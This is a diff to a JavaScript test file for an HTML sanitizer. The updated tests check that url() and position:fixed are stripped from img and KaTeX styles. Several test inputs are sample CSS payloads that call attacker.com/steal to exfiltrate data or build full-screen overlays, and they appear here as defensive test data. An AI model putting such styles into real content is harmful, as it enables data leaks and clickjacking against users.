@@ -224,11 +224,35 @@ describe('sanitizeHtmlContent', () => {
       expect(result).not.toContain('style=');
     });
 
-    it('should allow style on img elements', () => {
+    it('should allow safe CSS properties on img elements', () => {
       const result = sanitizeHtmlContent(
         '<img src="https://example.com/i.jpg" style="max-width:100%" />'
       );
-      expect(result).toContain('style=');
+      expect(result).toContain('max-width:100%');
+    });
+
+    it('should strip url() from img style to prevent data exfiltration', () => {
+      const result = sanitizeHtmlContent(
+        '<img src="https://example.com/i.jpg" style="background:url(https://attacker.com/steal)" />'
+      );
+      expect(result).not.toContain('url(');
+      expect(result).not.toContain('attacker.com');
+    });
+
+    it('should strip position:fixed from img style to prevent overlay attacks', () => {
+      const result = sanitizeHtmlContent(
+        '<img src="https://example.com/i.jpg" style="position:fixed;top:0;left:0;width:100vw;height:100vh" />'
+      );
+      expect(result).not.toContain('position:fixed');
+    });
+
+    it('should allow safe img style properties and strip dangerous ones', () => {
+      const result = sanitizeHtmlContent(
+        '<img src="https://example.com/i.jpg" style="max-width:100%;position:absolute;background-image:url(evil)" />'
+      );
+      expect(result).toContain('max-width:100%');
+      expect(result).not.toContain('position');
+      expect(result).not.toContain('url(');
     });
   });
 
@@ -266,10 +290,34 @@ describe('sanitizeHtmlContent', () => {
       expect(result).toContain('target="_blank"');
     });
 
-    it('should allow style on span/div in math mode', () => {
-      const input = '<span class="katex" style="font-size:2em">math</span>';
+    it('should allow safe KaTeX styles on span/div in math mode', () => {
+      const input =
+        '<span class="katex" style="font-size:1.2em;vertical-align:-0.25em">math</span>';
       const result = sanitizeHtmlContent(input);
-      expect(result).toContain('style=');
+      expect(result).toContain('font-size:1.2em');
+      expect(result).toContain('vertical-align:-0.25em');
+    });
+
+    it('should allow position:relative in math mode', () => {
+      const input =
+        '<span class="katex"><span style="position:relative;top:-2.655em">x</span></span>';
+      const result = sanitizeHtmlContent(input);
+      expect(result).toContain('position:relative');
+    });
+
+    it('should strip position:fixed in math mode', () => {
+      const input =
+        '<span class="katex"><span style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</span></span>';
+      const result = sanitizeHtmlContent(input);
+      expect(result).not.toContain('position:fixed');
+    });
+
+    it('should strip url() from styles in math mode', () => {
+      const input =
+        '<span class="katex" style="background:url(https://attacker.com/steal)">math</span>';
+      const result = sanitizeHtmlContent(input);
+      expect(result).not.toContain('url(');
+      expect(result).not.toContain('attacker.com');
     });
 
     it('should allow wildcard classes in math mode', () => {
